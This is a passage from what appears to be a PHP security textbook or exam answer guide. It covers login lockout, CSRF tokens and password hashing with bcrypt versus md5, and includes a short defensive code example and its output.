**Reading the output.** The first line shows three registration cases: a new user is accepted, the same e-mail is refused by the `UNIQUE` constraint, and a bad e-mail address is rejected before any hash is made. On the second line the first three wrong guesses all give the same message, which does not reveal whether the e-mail exists. The fourth attempt used the **correct** password but the answer is `locked`: after three failures the account refuses every attempt, so an attacker who guesses the password on the fourth try still gains nothing. A real system would unlock the account after a waiting time or by an e-mailed one-time link, and would also record the attempts in a log that an administrator can read. The last result, for an unknown e-mail, gives the same text as a wrong password, as planned.

**Conclusion.** A secure login is not one trick but a chain of small checks: validate, hash, prepare, limit, protect the session and encrypt the connection. Each measure answers one specific attack, and together they make the system safe enough for real users.

**Q4. What is CSRF? How does a CSRF token protect a PHP form? (5 marks)**

**Cross-site request forgery** is an attack in which a malicious page makes the victim's browser send a request to a site where the victim is already logged in. The browser attaches the session cookie automatically, so the site believes the user made the request (Fig. 7.3). The attacker cannot read the reply but can still change things: transfer money, change an e-mail address or delete data.

**Example.** The victim is logged in to an e-banking page and opens an evil page that contains a hidden form with `action="https://bank.example/transfer"`. The form is submitted by a script, and the bank receives a valid cookie with it.

**CSRF token defence.** The server creates a random secret for each session, such as `bin2hex(random_bytes(16))`, which is 32 hexadecimal characters. The secret is put in a hidden field of every real form. When the form is submitted, the server compares the sent value with the stored one using `hash_equals`. A forged request has no token or a wrong guess, so the check gives `false` and the request is refused with a 403 status. In the real run of Section 7.3 the legitimate form returned `true` and both forged requests returned `false`.

**More defences.** Use `SameSite=Lax` or `Strict` cookies, accept state changes only through `POST` or `DELETE` (never `GET`), and ask for the password again before critical actions.

**Q5. Why must passwords be hashed and not encrypted? Compare md5 and bcrypt, and explain salt and cost. (5 marks)**

**Encryption** can be reversed with a key, so a stolen key or a stolen database plus key reveals every password. A **hash** is one-way: the server stores only the hash and compares the hash of the typed password with it, so even the administrator cannot read the password. PHP gives `password_hash()` to create the hash and `password_verify()` to check a password.

**Salt and cost.** A **salt** is a random value added before hashing, so two users with the same password get different hashes and ready-made tables of hashes (rainbow tables) are useless. The **cost** makes each hash slow on purpose. In Fig. 7.4 the bcrypt string contains the algorithm and cost, a 22-character salt and a 31-character hash, 60 characters in all.

| Point | md5 / sha1 | bcrypt (`password_hash`) |
|---|---|---|
| Speed | Very fast: 7,663,699 per second measured | Slow: 21 per second at cost 10 |
| Salt | None (same input, same output) | Random salt built in |
| Adjustable cost | No | Yes: each +2 makes it 4 times slower |
| Suitable for passwords | No | Yes |

The next program was run for real:

```php
<?php
echo md5("nepal123") === md5("nepal123") ? "md5: same output every time\n" : "";
$a = password_hash("nepal123", PASSWORD_BCRYPT); $b = password_hash("nepal123", PASSWORD_BCRYPT);
echo "bcrypt hashes equal: ", var_export($a === $b, true), ", both verify: ", var_export(password_verify("nepal123", $a) && password_verify("nepal123", $b), true), "\n";
```
```output
md5: same output every time
bcrypt hashes equal: false, both verify: true
```
